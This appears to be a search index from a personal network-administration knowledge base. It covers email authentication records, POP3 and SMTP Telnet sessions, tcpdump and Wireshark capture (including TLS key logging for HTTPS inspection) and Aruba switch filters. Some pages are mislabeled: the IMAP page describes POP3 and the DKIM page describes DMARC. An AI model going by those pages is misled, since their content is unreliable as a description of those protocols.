<li>Broadcast IP</li> <li>First Host IP</li> <li>Last Host IP</li> <li>Next Network</li> <li>IP Addresses</li> <li>CIDR/Subnet</li> </ul>"},{"location":"Knowledge_Base/Network/Subnetting/#online-subnet-calculator","title":"Online Subnet calculator","text":"<p>jodies</p> <p></p>"},{"location":"Knowledge_Base/Network/VPN/","title":"VPN","text":"<p>VPN Types</p> <p></p>"},{"location":"Knowledge_Base/Network/Email/DKIM_DomainKeys_Identified_Mail/","title":"DKIM DomainKeys Identified Mail","text":""},{"location":"Knowledge_Base/Network/Email/DKIM_DomainKeys_Identified_Mail/#summary-resources","title":"Summary &amp; Resources","text":"<p>DomainKeys Identified Mail (DKIM) is a method of email authentication that helps prevent spammers and other malicious parties from impersonating a legitimate domain.</p> <ul> <li>dns-dkim-record</li> <li>Email Spoof Test</li> </ul>"},{"location":"Knowledge_Base/Network/Email/DKIM_DomainKeys_Identified_Mail/#how-it-works","title":"How it works","text":""},{"location":"Knowledge_Base/Network/Email/DKIM_DomainKeys_Identified_Mail/#example","title":"Example","text":"<pre><code>v=DMARC1; p=reject; rua=mailto:reportabuse@exampledomain.net; pct=100; adkim=s; aspf=s;\n\nv=DMARC1; p=reject; pct=100; adkim=s; aspf=s; rua=mailto:reportabuse@exampledomain.net; ruf=mailto:reportabuse@exampledomain.net; rf=afrf; ri=86400; fo=1_\n</code></pre>"},{"location":"Knowledge_Base/Network/Email/DKIM_DomainKeys_Identified_Mail/#tags","title":"Tags","text":"TAG TAG DESCRIPTION v (required) The\u00a0version tag. The only allowed value is \"DMARC1\". If it's incorrect or the tag is missing, the DMARC record will be ignored. p (required) The\u00a0DMARC policy. Allowed values are \"none\", \"quarantine\", or \"reject\". The default is \"none,\" which takes no action against non-authenticated emails. It only helps collect DMARC reports and gain insight into your current email flows and their authentication status. \"quarantine\" marks the failed emails as suspicious, while \"reject\" blocks them. rua Aggregate report sending destination. It's the \"mailto:\" URI that ESPs use to send failure reports. The tag is optional, but you won\u2019t receive reports if you skip it. ruf Forensic (Failure) report sending destination. It's the \"mailto:\" URI that ESPs use to send failure reports. The tag is optional, but you won\u2019t receive reports if you skip it. sp The subdomain policy. The subdomain inherits the domain policy tag (p=) explained above unless specifically defined here. Like the domain policy, the allowed values are \"none,\" \"quarantine,\" or \"reject.\" This option isn't widely used nowadays. adkim The\u00a0DKIM signature alignment. This tag follows the alignment between the DKIM domain and the parent Header From domain. Allowed values are \"r\" (relaxed) or \"s\" (strict). \"r\" is the default and allows a partial match, while the \"s\" tag requires the domains to be the same. aspf The SPF alignment. This tag follows the alignment between the SPF domain (the sender) and the Header From domain. Allowed values are \"r\" (relaxed) or \"s\" (strict). \"r\" is the default, and allows a partial match, while the \"s\" tag requires the domains to be exactly the same. fo Forensic reporting options. Allowed values are \"0,\" \"1,\" \"d,\" and \"s.\" \"0\" is the default value, which generates a forensic report when both SPF and DKIM fail to produce an aligned pass. If either of the protocol outcome is something other than pass, use \"1.\" \"d\" generates a report when DKIM is invalid, while \"s\" does the same for SPF. Define the ruf tag to receive forensic reports. rf The reporting format for failure reports. Allowed values are \"afrf\" and \"iodef\". pct The percentage tag. This tag works on domains with \"quarantine\" or \"reject\" policy only. It marks the percentage of failed emails a given policy should be applied to. The rest falls under a lower policy. For example, if \"pct=70,\" on a domain with \"quarantine\" policy, it applies only 70% of the time. The remaining 30% goes under \"p=none\". Similarly, if \"p=reject\" and \"pct=70,\" \"reject\" applies to the 70% of failed emails, and the 30% go into \"quarantine.\" ri Reporting interval. Marks the frequency of received XML reports in seconds. The default is 86400 (once a day). Regardless of the set interval, in most cases, ISPs send the reports at different intervals (usually once a day)."},{"location":"Knowledge_Base/Network/Email/DMARC_Domain-based_Message_Authentication_Reporting_and_Conformance/","title":"DMARC Domain-based Message Authentication Reporting and Conformance","text":""},{"location":"Knowledge_Base/Network/Email/DMARC_Domain-based_Message_Authentication_Reporting_and_Conformance/#summary-resources","title":"Summary &amp; Resources","text":"<p>Domain-based Message Authentication Reporting and Conformance (DMARC) is a method of authenticating email messages. A DMARC policy tells a receiving email server what to do after checking a domain's Sender Policy Framework (SPF) and DomainKeys Identified Mail (DKIM) records, which are additional email authentication methods.</p> <ul> <li>DNS DMARC record summary - Cloudflare</li> <li>DMARC org</li> <li>Email Spoof Test</li> </ul>"},{"location":"Knowledge_Base/Network/Email/DMARC_Domain-based_Message_Authentication_Reporting_and_Conformance/#how-it-works","title":"How it works","text":"<p>Settings up a DNS record for DMARC with all rejects. multiple types of content text provided</p> <pre><code>Type: TXT\nName: _dmarc\nContent: \"v=DMARC1; p=reject; pct=100\"\nContent: \"v=DMARC1; p=reject; pct=100; adkim=s; aspf=s\"\nContent: \"v=DMARC1; p=reject; pct=100; adkim=s; fo=1; aspf=s; rua=mailto:report@mydomain.com,mailto:report@xyz.com\"\n</code></pre>"},{"location":"Knowledge_Base/Network/Email/IMAP/","title":"IMAP","text":""},{"location":"Knowledge_Base/Network/Email/IMAP/#summary","title":"Summary","text":"<p>Internet Message Access Protocol (IMAP) - MAIL SYNC</p> <p>Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.</p> <p></p> <p>The example below shows what a\u00a0POP3\u00a0session would look like if conducted via a Telnet client</p> <ul> <li>The user connects to the POP3 server at the POP3 default port 110</li> <li>Authentication is required to access the email messages; the user authenticates by providing his username\u00a0<code>USER frank</code>\u00a0and password\u00a0<code>PASS D2xc9CgD</code>.</li> <li>Using the command\u00a0<code>STAT</code>, we get the reply\u00a0<code>+OK 1 179</code>; based on\u00a0RFC 1939, a positive response to\u00a0<code>STAT</code>\u00a0has the format\u00a0<code>+OK nn mm</code>, where\u00a0nn\u00a0is the number of email messages in the inbox, and\u00a0mm\u00a0is the size of the inbox in octets (byte).</li> <li>The command\u00a0<code>LIST</code>\u00a0provided a list of new messages on the server, and\u00a0<code>RETR 1</code>\u00a0retrieved the first message in the list.</li> </ul> <pre><code>telnet 10.10.45.250 110\n\n#Trying 10.10.45.250...\n#Connected to MACHINE_IP.\n#Escape character is '^]'.\n#+OK MACHINE_IP Mail Server POP3 Wed, 15 Sep 2021 11:05:34 +0300 \n</code></pre> <pre><code>USER frank\n#+OK frank\n</code></pre> <pre><code>PASS D2xc9CgD\n#+OK 1 messages (179) octets\n</code></pre> <pre><code>STAT\n#+OK 1 179\n</code></pre> <pre><code>LIST\n\n#+OK 1 messages (179) octets\n#1 179\n</code></pre> <pre><code>.\nRETR 1\n\n#+OK\n</code></pre> <pre><code>From: Mail Server \nTo: Frank \nsubject: Sending email with Telnet\nHello Frank,\nI am just writing to say hi!\n.\nQUIT\n\n\n#+OK MACHINE_IP closing connection\n#Connection closed by foreign host.\n</code></pre> <p>The example above shows that the commands are sent in cleartext. Using Telnet was enough to authenticate and retrieve an email message. As the username and password are sent in cleartext, any third party watching the network traffic can steal the login credentials.</p> <p>In general, your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages. Although the communication using the POP3 protocol will be hidden behind a sleek interface, similar commands will be issued, as shown in the Telnet session above.</p> <p>Based on the default settings, the mail client deletes the mail message after it downloads it. The default behaviour can be changed from the mail client settings if you wish to download the emails again from another mail client. Accessing the same mail account via multiple clients using\u00a0POP3\u00a0is usually not very convenient as one would lose track of read and unread messages. To keep all mailboxes synchronized, we need to consider other protocols, such as IMAP.</p>"},{"location":"Knowledge_Base/Network/Email/POP3/","title":"POP3","text":""},{"location":"Knowledge_Base/Network/Email/POP3/#summary","title":"Summary","text":"<p>Post Office Protocol 3 (POP3) - Get Mail from Server</p> <p>Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.</p> <p></p> <p>The example below shows what a\u00a0POP3\u00a0session would look like if conducted via a Telnet client. - The user connects to the POP3 server at the POP3 default port 110. - Authentication is required to access the email messages; the user authenticates by providing his username\u00a0<code>USER frank</code>\u00a0and password\u00a0<code>PASS D2xc9CgD</code>. - Using the command\u00a0<code>STAT</code>, we get the reply\u00a0<code>+OK 1 179</code>; based on\u00a0RFC 1939, a positive response to\u00a0<code>STAT</code>\u00a0has the format\u00a0<code>+OK nn mm</code>, where\u00a0nn\u00a0is the number of email messages in the inbox, and\u00a0mm\u00a0is the size of the inbox in octets (byte). - The command\u00a0<code>LIST</code>\u00a0provided a list of new messages on the server, and\u00a0<code>RETR 1</code>\u00a0retrieved the first message in the list.</p> <pre><code>telnet 10.10.45.250 110\n\n#Trying 10.10.45.250...\n#Connected to MACHINE_IP.\n#Escape character is '^]'.\n#+OK MACHINE_IP Mail Server POP3 Wed, 15 Sep 2021 11:05:34 +0300 \n</code></pre> <pre><code>USER &lt;frank&gt;\n\n#+OK frank\n</code></pre> <pre><code>PASS &lt;D2xc9CgD&gt;\n\n#+OK 1 messages (179) octets\n</code></pre> <pre><code>STAT\n\n#+OK 1 179\n</code></pre> <pre><code>LIST\n\n#+OK 1 messages (179) octets\n</code></pre> <pre><code>1 179\n.\nRETR 1\n\n#+OK\n</code></pre> <pre><code>From: Mail Server \nTo: Frank \nsubject: Sending email with Telnet\nHello Frank,\nI am just writing to say hi!\n.\nQUIT\n\n#+OK MACHINE_IP closing connection\n#Connection closed by foreign host.\n</code></pre> <p>The example above shows that the commands are sent in cleartext. Using Telnet was enough to authenticate and retrieve an email message. As the username and password are sent in cleartext, any third party watching the network traffic can steal the login credentials.</p> <p>In general, your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages. Although the communication using the POP3 protocol will be hidden behind a sleek interface, similar commands will be issued, as shown in the Telnet session above.</p> <p>Based on the default settings, the mail client deletes the mail message after it downloads it. The default behaviour can be changed from the mail client settings if you wish to download the emails again from another mail client. Accessing the same mail account via multiple clients using\u00a0POP3\u00a0is usually not very convenient as one would lose track of read and unread messages. To keep all mailboxes synchronized, we need to consider other protocols, such as IMAP.</p>"},{"location":"Knowledge_Base/Network/Email/SMTP/","title":"SMTP","text":"<p>Simple Mail Transfer Protocol (SMTP) - Send email</p>"},{"location":"Knowledge_Base/Network/Email/SMTP/#email-components","title":"Email components","text":"<p>Email delivery over the Internet requires the following components: 1. Mail Submission Agent (MSA) 2. Mail Transfer Agent (MTA) 3. Mail Delivery Agent (MDA) 4. Mail User Agent (MUA)</p> <p></p> <p>The figure shows the following five steps that an email needs to go through to reach the recipient\u2019s inbox:</p> <ol> <li>A Mail User Agent (MUA) or simply an email client connects to a Mail Submission Agent (MSA) to send it a user's email.</li> <li>The MSA receives the message, checks for any errors before transferring it to the Mail Transfer Agent (MTA) server, commonly hosted on the same server.</li> <li>The\u00a0MTA\u00a0will send the email message to the MTA of the recipient, The MTA can also function as a Mail Submission Agent (MSA).</li> <li>A typical setup would have the\u00a0MTA\u00a0server also functioning as a Mail Delivery Agent (MDA).</li> <li>The recipient will collect its email from the\u00a0MDA\u00a0using their email client.</li> </ol> <p>In the same way, we need to follow a protocol to communicate with an\u00a0HTTP\u00a0server, and we need to rely on email protocols to talk with an MTA and an MDA. The protocols are: 1. Simple Mail Transfer Protocol (SMTP) 2. Post Office Protocol version 3 (POP3) or Internet Message Access Protocol (IMAP)</p> <p>Simple Mail Transfer Protocol (SMTP) is used to communicate with an MTA server. Because SMTP uses cleartext, where all commands are sent without encryption, we can use a basic Telnet client to connect to an SMTP server and act as an email client (MUA) sending a message.</p> <p>SMTP\u00a0server listens on port 25 by default. To see basic communication with an SMTP server, we used Telnet to connect to it. Once connected, we issue\u00a0<code>helo hostname</code>\u00a0and then start typing our email.</p> <pre><code>telnet 10.10.45.250 25\n#Trying 10.10.45.250...\n#Connected to MACHINE_IP.\n#Escape character is '^]'.\n#220 bento.localdomain ESMTP Postfix (Ubuntu)\n</code></pre> <pre><code>helo telnet\n#250 bento.localdomain\n</code></pre> <pre><code>mail from: \n#250 2.1.0 Ok\n</code></pre> <pre><code>rcpt to: \n#250 2.1.5 Ok\n</code></pre> <pre><code>data\n#354 End data with .\n</code></pre> <pre><code>subject: Sending email with Telnet\nHello Frank,\nI am just writing to say hi!             \n.\n#250 2.0.0 Ok: queued as C3E7F45F06\n</code></pre> <pre><code>quit\n#221 2.0.0 Bye\n#Connection closed by foreign host.\n</code></pre> <p>After\u00a0<code>helo</code>, we issue\u00a0<code>mail from:</code>,\u00a0<code>rcpt to:</code>\u00a0to indicate the sender and the recipient. When we send our email message, we issue the command\u00a0<code>data</code>\u00a0and type our message. We issue\u00a0<code>&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</code>\u00a0(or\u00a0<code>Enter . Enter</code>\u00a0to put it in simpler terms). The\u00a0SMTP\u00a0server now queues the message.</p> <p>Generally speaking, we don\u2019t need to memorize\u00a0SMTP\u00a0commands. The console output above aims to help better explain what a typical mail client does when it uses SMTP.</p>"},{"location":"Knowledge_Base/Network/Email/SMTP/#mail-agents","title":"Mail Agents","text":"<p>There are four main agents:\u00a0</p> <ul> <li>MUA\u00a0(Mail User Agent) is the email client we mentioned above. It\u2019s an application or a website that you use to send and receive email messages.</li> <li>MSA\u00a0(Mail Submission Agent) receives emails from the email client, checks its headers, and verifies that the addresses are indicated correctly.\u00a0</li> <li>MTA\u00a0(Mail Transfer Agent) is a sendmail program that processes and transfers emails. It receives messages from the MSA. Most modern MTAs take on MSA\u2019s responsibilities. In that case, message transfer won\u2019t include MSAs. The most popular MTAs are Sendmail, Postfix, and Exim.</li> <li>MDA\u00a0(Mail Delivery Agent) is the final agent before your emails get delivered to the recipient\u2019s <code>SMTP</code> server and then retrieved through inbound email servers (IMAP or POP3).</li> </ul> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"Knowledge_Base/Network/Email/SPF_Sender_Policy_Framework/","title":"SPF Sender Policy Framework","text":""},{"location":"Knowledge_Base/Network/Email/SPF_Sender_Policy_Framework/#summary-resources","title":"Summary &amp; Resources","text":"<p>sender policy framework (SPF) record is a type of DNS TXT record that lists all the servers authorized to send emails from a particular domain.</p> <ul> <li>DNS SPF record overview - Cloudflare</li> <li>Open spf - SPF Record Syntax</li> <li>Email Spoof Test</li> </ul>"},{"location":"Knowledge_Base/Network/Email/SPF_Sender_Policy_Framework/#how-it-works","title":"How it works","text":""},{"location":"Knowledge_Base/Network/Email/SPF_Sender_Policy_Framework/#mechanisms","title":"Mechanisms","text":"<pre><code>\"+\" Pass\n\"-\" Fail\n\"~\" SoftFail\n\"?\" Neutral\n</code></pre>"},{"location":"Knowledge_Base/Network/Email/SPF_Sender_Policy_Framework/#the-all-mechanism","title":"The \"all\" mechanism","text":"<p>Allow domain's MXes to send mail for the domain, prohibit all others</p> <pre><code>v=spf1 mx -all\n</code></pre> <p>The domain sends no mail at all</p> <pre><code>v=spf1 -all\n</code></pre> <p>The domain owner thinks that SPF is useless and/or doesn't care.</p> <pre><code>v=spf1 +all\n</code></pre> <p>Settings up a DNS record for SPF fail all that are not included</p> <pre><code>spf\nType: TXT\nName: @\nContent: \"v=spf1 include:_spf.mx.xyz.net -all\"\n</code></pre>"},{"location":"Knowledge_Base/Network/Email/SPF_Sender_Policy_Framework/#tools","title":"Tools","text":"<ul> <li>DMARCShield github      DMARCShield is a Python program for email authentication and security. It offers a DMARC checker to ensure domain security, and a spoofing email sender to test for vulnerabilities. Protect your email communication and keep your domain safe with MailSecure.</li> </ul>"},{"location":"Knowledge_Base/Network/Ethernet_802.3/Ethernet_802.3/","title":"Ethernet 802.3","text":""},{"location":"Knowledge_Base/Network/Packet_Capture/TCP_Dump/","title":"TCP Dump","text":""},{"location":"Knowledge_Base/Network/Packet_Capture/TCP_Dump/#tcpdump-install","title":"TCPdump Install","text":"<p>For remote captures using tcpdump and without the use of sudo</p> <pre><code>sudo mkdir /usr/sbin/tcpdump/\nsudo apt-get install tcpdump -y\nsudo groupadd pcap\nsudo usermod -a -G pcap $USER\nsudo chgrp pcap /usr/sbin/tcpdump\nsudo chmod 750 /usr/sbin/tcpdump\nsudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump\n</code></pre>"},{"location":"Knowledge_Base/Network/Packet_Capture/TCP_Dump/#tcpdump-remote-capture","title":"TCPdump Remote Capture","text":"<p>Listener device on your switch should have a SPAN port (Port Mirroring) for your specific VLANs or Ports that you want to capture the traffic for</p> <p>Below example will capture traffic on VLAN 50 and write the output to cap.pcap located on Desktop and will filter ports 80,443,1812,1813 or host IP Address 192.168.1.50</p> <pre><code>sudo tcpdump -U -s 756 -i eth0.50 -w ~/Desktop/cap.pcap 'port 80 or port 443 or port 1812 or port 1813 or host 192.168.1.50'\n</code></pre>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_Filters/","title":"Wireshark Filters","text":""},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_GeoIP_Mapping/","title":"Wireshark GeoIP Mapping","text":""},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_GeoIP_Mapping/#test-pcap","title":"Test Pcap","text":"<p>Grab a trace file to test your GeoIP mapping setup gen2-mapping</p>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_GeoIP_Mapping/#download-the-geoip-database-files","title":"Download the GeoIP Database Files","text":"<p>Visit geolite2 to get the latest GeoLite2 free database files.</p> <ul> <li>GeoLite2-City[date].tar.gz_</li> <li>GeoLite2-Country[date].tar.gz_</li> <li>GeoLite2-ASN[date].tar.gz_</li> </ul> <p>The files contain a date stamp indicating the revision date of the file. MaxMind updates the GeoLite2 Country and City databases on the first Tuesday of each month and the GeoLite2 ASN database every Tuesday.</p> <p></p>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_GeoIP_Mapping/#set-up-a-directory-and-extract-key-mmdb-files-to-this-directory","title":"Set Up a Directory and Extract Key .mmdb Files to this Directory","text":"<p>Create a directory on your drive called MaxMind. This is where you will put all your .mmdb files after unzipping them.</p> <p>The MaxMind DB files you downloaded are in gzipped .tar file format. You'll need a tool to unzip the files (I use 7-Zip and WinZip on my systems).</p> <p>When you unzip the files, you will have these three files: - GeoLite2-City[date].tar_ - GeoLite2-Country[date].tar_ - GeoLite2-ASN[date].tar_</p> <p>Now the files are in .tar format (tarballs). We have one more unzipping process to go through. Unzip each of these .tar files. You will then have three directories containing the separate database files.</p> <ul> <li>\\GeoLite2-City[date] directory containing the _GeoLite2-City.mmdb file</li> <li>\\GeoLite2-Country[date] directory containing the _GeoLite2-Country.mmdb file</li> <li>\\GeoLite2-ASN[date] directory containing the _GeoLite2-ASN.mmdb file</li> </ul> <p>Finally, copy each of the .mmdb files from these directories into your \\MaxMind directory. Your directory should look something like this</p> <p></p>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_GeoIP_Mapping/#add-a-path-in-wireshark-preferences","title":"Add a Path in Wireshark Preferences","text":"<p>Note: This setting is unlike most other Wireshark preference settings. When you set up GeoIP mapping in a profile, the setting actually saved in the Wireshark default profile directory. This makes the GeoIP mapping available in all profiles.</p> <p>In Wireshark, select Edit | Preferences | Name Resolution. Next to MaxMind database directories, click the Edit button. Click the + button to add a directory and navigate to your \\MaxMind directory. Click OK to select your \\MaxMind directory and click OK to close the Preferences window.</p> <p>Restart Wireshark.</p> <p></p>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_GeoIP_Mapping/#build-your-maps","title":"Build Your Maps","text":"<p>Now comes the cool stuff! Load a trace file in Wireshark and select Statistics | Endpoints. Click on either the IPv4 or IPv6 tabs to see if you have some City, Country, AS Number, and AS Organization information available. An example is shown below.</p> <p></p> <p>Notice the Map button on the bottom of the Endpoints window. Click the Map button and select Open in browser. Wireshark launches your default browser and maps endponits based on the information available in the GeoLite2 database files. Pretty cool, eh?</p> <p></p> <p>You can also right click on any Endpoint row and select Apply as filter, Prepare a filter, Find, or Colorize.</p>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_GeoIP_Mapping/#filter-on-geoip-information","title":"Filter on GeoIP Information","text":"<p>Here's another interesting thing you can do after setting up GeoIP mapping in Wireshark. Look inside the IPv4 or IPv6 headers of the packets. The GeoIP information is contained at the end of the IPv4/IPv6 header, as shown in the image below.</p> <p></p> <p>You can create filters based on these fields. Some filter examples are shown below. - Destination City [IPv4]: ip.geoip.dst_city == \"Dublin\" - Source or Destination City [IPv4]: ip.geoip.city == \"Dublin\" - Destination Country: ip.geoip.dst_country == \"Ireland\" - Destination Country based on Country Code: ip.geoip.dst_country_iso == \"IE\" - All Destination Countries Except United States: !ip.geoip.country == \"United States\"</p> <p>Note that ip must be replaced with ipv6 if you are working within an IPv6 header.</p>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_GeoIP_Mapping/#add-and-sort-geoip-columns","title":"Add and Sort GeoIP Columns","text":"<p>Consider right-clicking on any of the GeoIP lines shown in the previous image and select Apply as column.</p> <p></p>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_GeoIP_Mapping/#resources","title":"Resources","text":"<ul> <li>Map IP Address Locations with Wireshark (Using GeoIP) - YouTube</li> <li>GeoIP Mapping in Wireshark</li> </ul>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_HTTPS_Inspection/","title":"Wireshark HTTPS Inspection","text":"<p>Ubuntu Linux HTTPS Inspection</p>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_HTTPS_Inspection/#method-1","title":"Method 1","text":"<pre><code>sudo apt install mitmproxy\nexport MITMPROXY_SSLKEYLOGFILE=/tmp/logfile.txt\necho $MITMPROXY_SSLKEYLOGFILE\n\nmitmproxy\n</code></pre> <p>Open browser and navigate to mitm.it</p>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_HTTPS_Inspection/#method-2","title":"Method 2","text":"<pre><code>export SSLKEYLOGFILE=/home/odroid/Desktop/ssllogfile.txt\necho $SSLKEYLOGFILE\n\nfirefox &amp;\n\nsudo wireshark\n</code></pre>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_Install/","title":"Wireshark Install","text":"<pre><code>sudo apt update\nsudo apt install wireshark\nsudo wireshark\n\napt show wireshark\nsudo add-apt-repository ppa:wireshark-dev/stable\nsudo apt update\nsudo apt install wireshark\napt show wireshark\nsudo wireshark\n\nsudo dpkg-reconfigure wireshark-common\n</code></pre>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_Malware_Analysis/","title":"Wireshark Malware Analysis","text":""},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_Malware_Analysis/#resources","title":"Resources","text":"<ul> <li>malware-traffic-analysis.net sub</li> <li>malware-traffic-analysis.net main</li> <li>ja3-fingerprints</li> </ul>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_Profiles/","title":"Wireshark Profiles","text":""},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_Ruckus_Odroid_Remote_Packet_Capture/","title":"Wireshark Ruckus Odroid Remote Packet Capture","text":"<p>To do a remote packet with Wireshark for Ruckus Access Point, you will need to SSH into the Master Access Point in order to run the following commands</p> <p>This sets up packet capture on 2.4GHz radio</p> <pre><code>set capture wlan100 stream\n</code></pre> <p>This displays status of 2.4GHz radio capture</p> <pre><code>get capture wlan100 state\n</code></pre> <p>To stop the capture on 2.4GHz radio</p> <pre><code>set capture wlan100 idle\n</code></pre> <p>This sets up packet capture on 5GHz radio</p> <pre><code>set capture wlan101 stream\n</code></pre> <p>This displays status of 5GHz radio capture</p> <pre><code>get capture wlan101 state\n</code></pre> <p>To stop the capture on 5GHz radio</p> <pre><code>set capture wlan101 idle\n</code></pre>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_SNMP/","title":"Wireshark SNMP","text":"<p>Filter snmp Analyze &gt; decode as &gt; SNMP</p>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_Summary/","title":"Wireshark Summary","text":""},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_Summary/#resources","title":"Resources","text":"<ul> <li>Laura Chappel - Packet Capture samples</li> <li>Laura Chappel - Blog</li> <li>Wireshark User's Guide</li> <li>Chris Greer - Youtube</li> <li>Chris Greer - Udemy</li> <li>TryHackMe - Wireshark</li> <li>Packet Dissection</li> </ul>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_Summary/#dissectors","title":"Dissectors","text":"<ul> <li>https://github.com/wireshark/wireshark/blob/master/epan/dissectors/packet-snmp.c</li> <li>https://github.com/wireshark/wireshark</li> <li>https://www.wireshark.org/docs/wsdg_html_chunked/ChDissectReassemble.html</li> </ul>"},{"location":"Knowledge_Base/Network/Packet_Capture/Wireshark/Wireshark_disable_dark_mode/","title":"Wireshark disable dark mode","text":"<p>Run in cmd to disable dark mode for Wireshark on Windows</p> <pre><code>\"C:\\Program Files\\Wireshark\\Wireshark.exe\" -platform windows:darkmode=1\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_HP_Multicast_and%20Broadcast/","title":"Aruba HP Multicast and Broadcast","text":"<p>General use to deal with casting issues, using filter source-port and loop-protect</p> <pre><code>filter source-port \"1\" drop 2-23\nfilter source-port \"2\" drop 1,3-23\nfilter source-port \"3\" drop 1-2,4-23\nfilter source-port \"4\" drop 1-3,5-23\nfilter source-port \"5\" drop 1-4,6-23\nfilter source-port \"6\" drop 1-5,7-23\nfilter source-port \"7\" drop 1-6,8-23\nfilter source-port \"9\" drop 1-8,10-23\nfilter source-port \"10\" drop 1-9,11-23\nfilter source-port \"11\" drop 1-10,12-23\nfilter source-port \"12\" drop 1-11,13-23\nfilter source-port \"13\" drop 1-12,14-23\nfilter source-port \"14\" drop 1-13,15-23\nfilter source-port \"15\" drop 1-14,16-23\nfilter source-port \"16\" drop 1-15,17-23\nfilter source-port \"17\" drop 1-16,18-23\nfilter source-port \"18\" drop 1-17,19-23\nfilter source-port \"19\" drop 1-18,20-23\nfilter source-port \"20\" drop 1-19,21-23\nfilter source-port \"21\" drop 1-20,22-23\nfilter source-port \"22\" drop 1-21,23-23\nfilter source-port \"23\" drop 1-22\n\nloop-protect 1-24\nloop-protect 1-24 receiver-action no-disable\n</code></pre> <p>For a 48 port switch, I would update this to eliminate uplink port from script, unless that works for you.</p> <pre><code>filter source-port \"1\" drop 2-48\nfilter source-port \"2\" drop 1,3-48\nfilter source-port \"3\" drop 1-2,4-48\nfilter source-port \"4\" drop 1-3,5-48\nfilter source-port \"5\" drop 1-4,6-48\nfilter source-port \"6\" drop 1-5,7-48\nfilter source-port \"7\" drop 1-6,8-48\nfilter source-port \"9\" drop 1-8,10-48\nfilter source-port \"10\" drop 1-9,11-48\nfilter source-port \"11\" drop 1-10,12-48\nfilter source-port \"13\" drop 1-12,14-48\nfilter source-port \"14\" drop 1-13,15-48\nfilter source-port \"15\" drop 1-14,16-48\nfilter source-port \"16\" drop 1-15,17-48\nfilter source-port \"17\" drop 1-16,18-48\nfilter source-port \"18\" drop 1-17,19-48\nfilter source-port \"19\" drop 1-18,20-48\nfilter source-port \"20\" drop 1-19,21-48\nfilter source-port \"21\" drop 1-20,22-48\nfilter source-port \"22\" drop 1-21,23-48\nfilter source-port \"23\" drop 1-22,24-48\nfilter source-port \"24\" drop 1-23,25-48\nfilter source-port \"25\" drop 1-24,26-48\nfilter source-port \"26\" drop 1-25,27-48\nfilter source-port \"27\" drop 1-26,28-48\nfilter source-port \"28\" drop 1-27,29-48\nfilter source-port \"29\" drop 1-28,30-48\nfilter source-port \"30\" drop 1-29,31-48\nfilter source-port \"31\" drop 1-30,32-48\nfilter source-port \"32\" drop 1-31,33-48\nfilter source-port \"33\" drop 1-32,34-48\nfilter source-port \"34\" drop 1-33,35-48\nfilter source-port \"35\" drop 1-34,36-48\nfilter source-port \"36\" drop 1-35,37-48\nfilter source-port \"37\" drop 1-36,38-48\nfilter source-port \"38\" drop 1-37,39-48\nfilter source-port \"39\" drop 1-38,40-48\nfilter source-port \"40\" drop 1-39,41-48\nfilter source-port \"41\" drop 1-40,42-48\nfilter source-port \"42\" drop 1-41,43-48\nfilter source-port \"43\" drop 1-42,44-48\nfilter source-port \"44\" drop 1-43,45-48\nfilter source-port \"45\" drop 1-44,46-48\nfilter source-port \"46\" drop 1-45,47-48\nfilter source-port \"47\" drop 1-46,48\n\nloop-protect 1-48\nloop-protect 1-48 receiver-action no-disable\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/AP_Configuration_Sync_issues_Aruba_Central_and_Instant/","title":"AP Configuration Sync issues Aruba Central and Instant","text":"<p>This applies to Aruba Instant Access Points running Aruba InstantOS 3.3 or higher.</p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/AP_Configuration_Sync_issues_Aruba_Central_and_Instant/#how-to-troubleshoot-configuration-sync-problems-between-master-and-slave-iaps","title":"How to troubleshoot configuration sync problems between master and slave IAPs?","text":"<p>Configuration changes in an IAP cluster is centralized on Master IAP and it assigns a\u00a0cfg_id(Configuration ID) to every different configuration change that occurred.\u00a0If the Slave IAPs cfg_id is different with master, master should send recorded configuration to the slave Instant AP.\u00a0On receiving configuration message from Master, Slave updates the configuration and then its owncfg_id.  </p> <p>Due to load or congestion on the network, configuration synchronization issues might rise up between Master and Slave IAPs. First steps in troubleshooting sync issues is to look at the config_id on Master and Slave.  </p> <p>Run the below command to view the config_id on Master or Slave IAP:  </p> <p></p> 